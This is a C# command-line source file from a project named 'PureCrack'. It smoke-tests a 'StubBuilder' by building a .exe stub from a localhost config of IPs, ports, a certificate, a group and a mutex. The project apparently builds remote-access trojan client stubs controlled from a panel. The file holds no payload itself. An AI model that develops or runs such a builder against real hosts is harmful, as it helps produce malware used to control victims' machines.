using System;
using System.IO;
using PureCrack.Build;
using PureCrack.Util;

namespace PureCrack.Cli;

/// <summary>
/// Exercises the StubBuilder pipeline against a hard-coded test config
/// and writes the result to <c>runs/stubs/</c>. No relay, no panel, no
/// admin needed beyond what the manifest already requires. Useful as a
/// CI regression check for the build path.
/// </summary>
public static class SmokeBuildCommand
{
    public static int Run()
    {
        Log.Section("smoke-build: exercise the StubBuilder pipeline only");
        var cfg = new BuildConfig
        {
            Ips = new() { "127.0.0.1" },
            Ports = new() { 56001 },
            CertPfxBase64 = "",
            Group = "smoke-test",
            Mutex = "purecrack-smoke",
        };
        try
        {
            var exeBytes = StubBuilder.Build(cfg);
            var outPath = Path.Combine(Workspace.StubsDir,
                $"smoke_{DateTime.Now:yyyyMMdd_HHmmss}.exe");
            AtomicFile.WriteAllBytes(outPath, exeBytes);
            Log.Ok($"smoke-build OK — wrote {exeBytes.Length:N0}b stub to {outPath}");
            return 0;
        }
        catch (Exception ex)
        {
            Log.Err($"smoke-build FAILED: {ex.Message}");
            Log.Bullet(ex.ToString());
            return 1;
        }
    }
}
